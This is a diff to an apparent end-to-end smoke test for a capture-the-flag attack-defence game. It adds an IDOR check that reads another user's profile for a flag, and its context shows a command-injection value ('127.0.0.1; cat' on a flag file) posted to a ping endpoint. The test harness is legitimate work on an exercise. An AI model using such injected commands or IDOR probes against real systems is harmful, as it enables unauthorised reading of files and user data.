@@ -55,6 +55,11 @@ def _xss_flag() -> str:
     raise RuntimeError("admin-bot never leaked the XSS flag")
 
 
+def _idor_flag() -> str:
+    resp = requests.get(f"{TARGET}/api/v1/users/1/profile", timeout=5)
+    return resp.json()["flag"]
+
+
 def _cmdi_flag(flag_path: Path) -> str:
     resp = requests.post(f"{TARGET}/api/v1/diagnostics/ping",
                          json={"host": f"127.0.0.1; cat {flag_path}"}, timeout=5)
@@ -92,7 +97,8 @@ def main() -> int:
         time.sleep(3)  # let the target mirror the referee's flag
 
         flag_path = tmp / "flags" / "flag_current.txt"
-        checks = {"sqli": _sqli_flag(), "xss": _xss_flag(), "cmdi": _cmdi_flag(flag_path)}
+        checks = {"sqli": _sqli_flag(), "xss": _xss_flag(),
+                  "cmdi": _cmdi_flag(flag_path), "idor": _idor_flag()}
 
         for vector, flag in checks.items():
             verdict = requests.post(f"{REFEREE}/flags/submit",
@@ -107,7 +113,7 @@ def main() -> int:
         assert report["scores"]["red"] > 0, report
         assert set(report["vectors_detected"]) == set(), "no blue in this smoke"
         captured = {c["vector"] for c in report["captures"]}
-        assert {"sqli", "xss", "cmdi"} <= captured, captured
+        assert {"sqli", "xss", "cmdi", "idor"} <= captured, captured
         print(f"e2e match: red scored {report['scores']['red']} across {sorted(captured)}")
         return 0
     finally:
